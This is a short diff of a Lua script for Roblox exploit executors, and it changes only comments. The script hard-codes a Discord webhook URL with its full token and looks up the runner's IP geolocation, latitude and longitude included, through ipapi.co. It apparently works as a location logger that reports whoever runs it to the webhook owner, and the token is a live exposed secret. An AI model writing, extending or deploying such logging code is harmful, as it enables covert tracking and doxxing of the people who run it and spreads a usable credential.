@@ -4,7 +4,7 @@ local HttpService = game:GetService("HttpService")
 local req = (http_request or request or syn and syn.request)
 
 -- SETTINGS
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1372316329012498452/dHiTEVxQeG2YLDflZeFPKteXaPo8n13Ka01lLvY4D3V2YdkpmeE9gWe0n4GCQ4i0jnUY" -- Your actual webhook
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1372316329012498452/dHiTEVxQeG2YLDflZeFPKteXaPo8n13Ka01lLvY4D3V2YdkpmeE9gWe0n4GCQ4i0jnUY"
 
 -- Ensure HTTP request is working
 if not req then
@@ -29,7 +29,7 @@ end)
 -- TRY TO GET GEOLOCATION (INCLUDING LAT/LONG)
 pcall(function()
     local geoResponse = req({
-        Url = "https://ipapi.co/json",
+        Url = "https://ipapi.co/json",  -- Geo data including latitude and longitude
         Method = "GET"
     })
     if geoResponse and geoResponse.StatusCode == 200 then
